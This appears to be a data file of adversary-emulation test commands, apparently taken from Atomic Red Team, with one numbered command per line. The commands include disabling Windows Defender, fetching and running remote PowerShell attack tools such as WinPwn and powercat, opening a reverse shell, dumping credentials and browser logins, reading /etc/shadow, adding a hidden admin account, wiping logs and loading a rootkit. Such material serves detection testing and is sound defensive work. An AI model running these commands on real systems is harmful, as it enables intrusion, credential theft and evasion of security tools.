45	Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIntrusionPreventionSystem" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRoutinelyTakingAction" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 1  ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 1 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 0 ;Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 0 ;Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 0 ;Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection"  -Value 0 ;Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 0 ;Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 0 
174	$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
284	New-WebGlobalModule -Name #{module_name} -Image #{dll_path}
39	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
189	sudo #{compiled_file} #{source_file}
272	NET USER #{user_name}$ #{user_password} /ADD /expires:never ;REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /t REG_DWORD /d 0
136	Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}
148	testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }&&[ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd&&testcat /etc/passwd&&testcat /etc/shadow
77	$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My;Set-Location Cert:\LocalMachine\My;Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
199	Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null;Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null;Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\Login Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\" > $null;cd "$env:PathToAtomicsFolder\T1555.003\bin";.\BrowserCollector.exe
264	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');samfile -consoleoutput -noninteractive  
102	copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe';$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"));$com.ActivateMicrosoftApp("5")
219	reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"
293	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
255	curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
44	Start-Process #{MSP360_Connect_Path}
35	copy #{exe_to_launch} not_an_scr.scr;rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
153	killall 'Google Chrome'&&sleep 1&&open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/&&sleep 1&&/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
81	netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
19	security import #{cert_export} -k
12	echo 0> #{log_path}
114	IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1');powercat -c #{server_ip} -p #{server_port}
300	uname -srm
155	DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
157	Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'
245	$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption;$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText;$newLegalNoticeCaption = "#{legal_notice_caption}";$newLegalNoticeText = "#{legal_notice_text}";Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      
167	PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "#{output_folder}"
57	[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9&&if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
218	az login;$userprincipalname = "#{userprincipalname}";az ad user delete --id $userprincipalname
225	icacls "#{path}" /grant Everyone:F /T /C /Q
138	cmstp.exe /s "#{inf_file_uac}" /au
12	echo 0> /var/spool/mail/#{username}
220	# Extract line with IP address from the syslog configuration output;#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt;;# Replace the IP with "0";#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt;;# Extract the IP from the line extracted from findstr;$inputFilePath = "c:\temp\loghost.txt";$outputFilePath = "c:\temp\loghost_ip.txt";;$fileContent = Get-Content -Path $inputFilePath -Raw;;if ([string]::IsNullOrWhiteSpace($fileContent)) {;    Write-Host "The content is $fileContent";    Write-Host "The file is empty";} else {;    # Use a regular expression to extract IP addresses;    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value;    ;    $output = "esxcli system syslog config set --loghost=" + $ipAddresses;;    $output | Out-File -FilePath $outputFilePath -Encoding ascii;    ;    Write-Host "IP addresses extracted and saved to $outputFilePath";}
27	set comspec=#{command_to_execute};cscript %windir%\System32\manage-bde.wsf
64	gcloud config set project #{project-id}&&gcloud iam roles create #{role-name} --description="#{role-description}" --permissions=#{roles} --project=#{project-id}
74	sudo modprobe #{rootkit_name}&&ping -c 10 localhost >/dev/null & TARGETPID="$!"&&ps $TARGETPID&&kill -31 $TARGETPID&&ps $TARGETPID || echo "process ${TARGETPID} hidden"
